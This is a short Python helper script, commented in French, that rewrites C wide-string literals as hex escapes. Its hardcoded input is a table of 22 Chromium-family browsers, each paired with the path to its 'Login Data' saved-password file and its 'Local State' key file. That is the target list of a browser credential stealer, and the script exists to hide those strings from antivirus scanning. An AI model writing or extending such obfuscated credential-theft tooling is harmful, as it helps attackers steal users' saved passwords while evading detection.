import re

def string_to_hex(s):
    # Convertir chaque caractère en sa valeur hexadécimale
    hex_values = [f"\\x{ord(c):02x}" for c in s]
    return ''.join(hex_values)

def process_line(line):
    # Utiliser une expression régulière pour trouver les chaînes de caractères
    pattern = r'L"([^"]*)"'
    matches = re.findall(pattern, line)

    for match in matches:
        # Remplacer les doubles backslashes par des simples backslashes
        match = match.replace('\\\\', '\\')
        # Convertir la chaîne en hexadécimal
        hex_string = string_to_hex(match)
        # Remplacer la chaîne originale par la chaîne hexadécimale
        line = line.replace(f'L"{match}"', f'L"{hex_string}"')

    return line

def main():
    # Lire les lignes de code C
    lines = [
        '{L"7Star", L"\\7Star\\7Star\\User Data\\Default\\Login Data", L"\\7Star\\7Star\\User Data\\Local State"},',
        '{L"Amigo", L"\\Amigo\\User Data\\Default\\Login Data", L"\\Amigo\\User Data\\Local State"},',
        '{L"Brave", L"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"},',
        '{L"CentBrowser", L"\\CentBrowser\\User Data\\Default\\Login Data", L"\\CentBrowser\\User Data\\Local State"},',
        '{L"Chedot", L"\\Chedot\\User Data\\Default\\Login Data", L"\\Chedot\\User Data\\Local State"},',
        '{L"Chrome Beta", L"\\Google\\Chrome Beta\\User Data\\Default\\Login Data", L"\\Google\\Chrome Beta\\User Data\\Local State"},',
        '{L"Chrome Canary", L"\\Google\\Chrome SxS\\User Data\\Default\\Login Data", L"\\Google\\Chrome SxS\\User Data\\Local State"},',
        '{L"Chromium", L"\\Chromium\\User Data\\Default\\Login Data", L"\\Chromium\\User Data\\Local State"},',
        '{L"Microsoft Edge", L"\\Microsoft\\Edge\\User Data\\Default\\Login Data", L"\\Microsoft\\Edge\\User Data\\Local State"},',
        '{L"CocCoc", L"\\CocCoc\\Browser\\User Data\\Default\\Login Data", L"\\CocCoc\\Browser\\User Data\\Local State"},',
        '{L"Comodo Dragon", L"\\Comodo\\Dragon\\User Data\\Default\\Login Data", L"\\Comodo\\Dragon\\User Data\\Local State"},',
        '{L"Elements Browser", L"\\Elements Browser\\User Data\\Default\\Login Data", L"\\Elements Browser\\User Data\\Local State"},',
        '{L"DCBrowser", L"\\DCBrowser\\User Data\\Default\\Login Data", L"\\DCBrowser\\User Data\\Local State"},',
        '{L"Epic Privacy Browser", L"\\Epic Privacy Browser\\User Data\\Default\\Login Data", L"\\Epic Privacy Browser\\User Data\\Local State"},',
        '{L"Google Chrome", L"\\Google\\Chrome\\User Data\\Default\\Login Data", L"\\Google\\Chrome\\User Data\\Local State"},',
        '{L"Kometa", L"\\Kometa\\User Data\\Default\\Login Data", L"\\Kometa\\User Data\\Local State"},',
        '{L"Orbitum", L"\\Orbitum\\User Data\\Default\\Login Data", L"\\Orbitum\\User Data\\Local State"},',
        '{L"QQBrowser", L"\\Tencent\\QQBrowser\\User Data\\Default\\Login Data", L"\\Tencent\\QQBrowser\\User Data\\Local State"},',
        '{L"Sputnik", L"\\Sputnik\\Sputnik\\User Data\\Default\\Login Data", L"\\Sputnik\\Sputnik\\User Data\\Local State"},',
        '{L"Torch", L"\\Torch\\User Data\\Default\\Login Data", L"\\Torch\\User Data\\Local State"},',
        '{L"Uran", L"\\uCozMedia\\Uran\\User Data\\Default\\Login Data", L"\\uCozMedia\\Uran\\User Data\\Local State"},',
        '{L"Vivaldi", L"\\Vivaldi\\User Data\\Default\\Login Data", L"\\Vivaldi\\User Data\\Local State"},'
    ]

    # Traiter chaque ligne
    for line in lines:
        processed_line = process_line(line)
        print(processed_line)

if __name__ == "__main__":
    main()

